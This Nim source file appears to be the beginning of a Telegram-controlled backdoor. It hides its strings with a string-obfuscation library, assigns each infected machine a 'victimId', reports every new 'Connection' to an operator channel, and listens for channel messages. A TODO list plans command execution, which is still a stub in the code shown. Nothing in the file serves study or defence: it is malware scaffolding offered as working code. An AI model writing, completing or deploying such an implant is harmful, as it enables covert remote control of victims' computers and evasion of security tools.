import std/[strutils, sequtils, os, osproc, asyncdispatch]
import telebot
import dotenv
import nimprotect
import nanoid


#[ TODO List

1. Automaticaly get new ID on each new Connection ✅
2. Save the ID to the Master Database using the Master Bot
3. Add handler for command execution

]#

var env_path: string = getCurrentDir()
env_path.add(protectString("/../"))

load(env_path)

let API_KEY: string = strip(getEnv(protectString("ALPHA_BOT_TOKEN")))
let victimId: string = generate(protectString("abcdefABCDEF1234567890"), size = 16)
let chanId: string = strip(getEnv(protectString("CHANNEL_ID")))

proc commandHandler(cmd: seq[string]) =
    discard

proc messageHandler(bot: TeleBot, update: Update): Future[bool] {.async.} =
    var message: string

    # Only handle channel posts
    if not update.channelPost.isNil() and not update.channelPost.text.isNil():
        message = update.channelPost.text

    if message.len <= 1:
        return false
    else:
        echo(protectString("Received message: ") & message)
        discard await bot.sendMessage(update.channelPost.chat.id,
                protectString("Message received: ") & message)
        return true

when isMainModule:
    # Initialize the TeleBot
    let bot = newTeleBot(API_KEY)

    discard bot.sendMessage(chanId, protectString("*Connection*: ") & victimId,
            parseMode = protectString("Markdown")) # Indicate a new Connection
    bot.onUpdate(messageHandler)
    bot.poll(offset = -1, limit = 1)
